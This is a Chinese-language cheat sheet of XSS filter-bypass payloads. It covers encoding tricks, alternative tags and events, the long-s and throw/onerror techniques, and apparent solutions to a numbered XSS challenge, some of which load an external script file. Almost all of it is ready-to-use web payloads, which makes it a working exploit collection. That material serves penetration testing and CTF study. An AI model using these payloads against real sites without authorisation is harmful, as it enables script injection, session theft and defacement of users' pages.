# XSS 过滤器绕过速查表

## 快速参考

### 基础 Payload
```javascript
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
" onmouseover=alert(1) x="
```

### 编码绕过
```javascript
&lt;script&gt;alert(1)&lt;/script&gt;
&#60;script&#62;alert(1)&#60;/script&#62;
\u003Cscript\u003Ealert(1)\u003C/script\u003E
\x3Cscript\x3Ealert(1)\x3C/script\x3E
```

---

## 常见过滤器绕过表

| 过滤器 | 绕过方法 | 示例 |
|--------|----------|------|
| **script** | 替代标签 | `<img src=x onerror=alert(1)>` |
| | SVG 标签 | `<svg onload=alert(1)>` |
| | iframe 标签 | `<iframe src="javascript:alert(1)">` |
| | body 标签 | `<body onload=alert(1)>` |
| | 双写绕过 | `<scrscriptipt>alert(1)</scrscriptipt>` |
| **alert** | 替代函数 | `<script>prompt(1)</script>` |
| | | `<script>confirm(1)</script>` |
| | 编码绕过 | `<script>eval('aler\x74(1)')</script>` |
| | | `<script>setTimeout('alert(1)')</script>` |
| **onerror** | 替代事件 | `<img src=x onload=alert(1)>` |
| | | `<svg onload=alert(1)>` |
| | | `<body onload=alert(1)>` |
| **onload** | 替代事件 | `<img src=x onerror=alert(1)>` |
| | | `<svg onerror=alert(1)>` |
| | | `<body onmouseover=alert(1)>` |
| **()** | 反引号 | `<script>alert\`1\`</script>` |
| | call/apply | `<script>alert.call(null,1)</script>` |
| | | `<script>setTimeout\`alert\u00281\u0029\`</script>` |
| **""** | 反引号 | `<script>alert\`1\`</script>` |
| | 正则表达式 | `<script>alert(/1/.source)</script>` |
| **空格** | 斜杠 | `<img/src=x/onerror=alert(1)>` |
| | 换行符 | `<img\nsrc=x\nonerror=alert(1)>` |
| **大小写** | 混合大小写 | `<ScRiPt>alert(1)</ScRiPt>` |
| | Unicode | `<scr\u0069pt>alert(1)</scr\u0069pt>` |
| **HTML 实体** | 原始字符 | `<script>alert(1)</script>` |
| | Unicode | `\u003Cscript\u003Ealert(1)\u003C/script\u003E` |
| **URL 编码** | 原始字符 | `<script>alert(1)</script>` |
| | 双重编码 | `%253Cscript%253Ealert(1)%253C/script%253E` |

---

## 冷门知识点速查

### 1. HTML 注释符
```javascript
<!-- -->     // 常规
<!-- --!>    // 冷门，同样可闭合注释
```

### 2. 不闭合标签执行
```javascript
<svg/onload=alert(1)>    // 无需闭合 >
<img src=x onerror=alert(1)>
```

### 3. 空格闭合标签
```javascript
</style >    // style 后加空格，绕过过滤且正常闭合
```

### 4. 古英文字符绕过
```javascript
<ſvg/onload=alert(1)>    // ſ 是 s 的异体字，大写为 S
```

### 5. throw + onerror 绕过括号
```javascript
<svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
```

### 6. 实体编码绕过大写
```javascript
</H1> <img src=M onerror=alert(1)>    // alert(1) 在属性内，不受大写影响
```

### 7. 双写绕过
```javascript
<scrscriptipt>alert(1)</scrscriptipt>    // 过滤后变为 script
```

### 8. JavaScript 注释符
```javascript
alert(1)//     // 单行注释
alert(1)-->    // HTML 单行注释符
```

---

## 实战绕过案例速查

### 0x00 - 无过滤
```javascript
<script>alert(1)</script>
```

### 0x01 - textarea 标签闭合
```javascript
</textarea><script>alert(1)</script>
```

### 0x02 - input 标签属性注入
```javascript
"><image src='#' onerror=alert(1) autofocus "
```

### 0x03 - 括号过滤
```javascript
<script>alert`1`</script>
```
```javascript
<svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
```

### 0x04 - 括号和反引号过滤
```javascript
<img src=x onerror=alert(1)>
```
```javascript
<img src onerror="window.onerror=eval;throw'=alert\x281\x29';">
```

### 0x05 - HTML 注释符过滤
```javascript
--!><script>alert(1)</script>
```

### 0x06 - 正则过滤 auto/on.*=/>/ig，点击触发

```javascript
onfocus
=alert(1);
```

### 0x07 - 过滤所有标签，使用不闭合标签加回车

```javascript
<svg onload=alert(1)\n
```

### 0x08 - 过滤 </style>
```javascript
</style >
<img src="" onerror=alert(1) >
```

### 0x09 - URL 验证
```javascript
http://www.segmentfault.com" onerror="alert(1)
```

### 0x0A - URL 验证 + 引入外部文件

```javascript
https://www.segmentfault.com.haozi.me/j.js
```

### 0x0B - 大写转换+实体编码绕过

```javascript
</H1> <img src=M onerror=&#97;&#108;&#101;&#114;&#116;(1)>
```

### 0x0C - 过滤 script + 大写转换+实体编码绕过

```javascript
</H1> <img src onerror=&#97;&#108;&#101;&#114;&#116;(1)>
```

### 0x0D - 过滤 <>/'" + 单行注释

```javascript
（第一行：回车）
alert(1);
-->
```

### 0x0E - 过滤 <+字母 + 大写转换
```javascript
<ſcript src=https://www.segmentfault.com.haozi.me/j.js></ſcript>
```

### 0x0F - 实体编码 + console.error
```javascript
'),alert(1); //
```

### 0x10 - 无过滤
```javascript
alert(1);
```

### 0x11 - JavaScript 字符串转义
```javascript
"); alert(1) //
```

### 0x12 - 仅过滤双引号
```javascript
\");alert(1)//
```
```javascript
</script><script>alert(1)</script>
```

---

## 事件处理器速查

### 常用事件
```javascript
onload       // 页面/元素加载完成
onerror      // 加载错误
onmouseover  // 鼠标悬停
onfocus      // 获得焦点
onclick      // 点击
ondblclick   // 双击
onmousedown  // 鼠标按下
onmouseup    // 鼠标释放
onkeydown    // 按键按下
onkeyup      // 按键释放
onsubmit     // 表单提交
onchange     // 值改变
oninput      // 输入
```

### 自动触发事件
```javascript
<body onload=alert(1)>
<svg onload=alert(1)>
<iframe onload=alert(1)>
<img src=x onerror=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
<input autofocus onfocus=alert(1)>
```

---

## 编码速查

### HTML 实体编码
```javascript
&lt;   // <
&gt;   // >
&quot;  // "
&#39; // '
&amp;  // &
```

### URL 编码
```javascript
%3C   // <
%3E   // >
%22   // "
%27   // '
%20   // 空格
```

### Unicode 编码
```javascript
\u003C   // <
\u003E   // >
\u0022   // "
\u0027   // '
\u0028   // (
\u0029   // )
```

### 十六进制编码
```javascript
\x3C   // <
\x3E   // >
\x22   // "
\x27   // '
\x28   // (
\x29   // )
```

---

## 测试策略

### 1. 基础测试
- 尝试最简单的 payload
- 确认漏洞存在性

### 2. 编码测试
- 尝试各种编码方式
- 测试过滤器对编码的处理

### 3. 绕过测试
- 尝试各种绕过技术
- 测试过滤器的边界条件

### 4. 上下文测试
- 根据注入点上下文调整 payload
- 考虑 HTML、JavaScript、URL 等不同上下文

### 5. 组合测试
- 组合多种绕过技术
- 持续尝试新方法

---

## 成功标准

- 弹出 alert(1)
- 页面标题变为 "警报（1） --- alert(1)"
- 控制台执行 alert(1)

---

**最后更新**: 2026-02-11
**版本**: 1.0
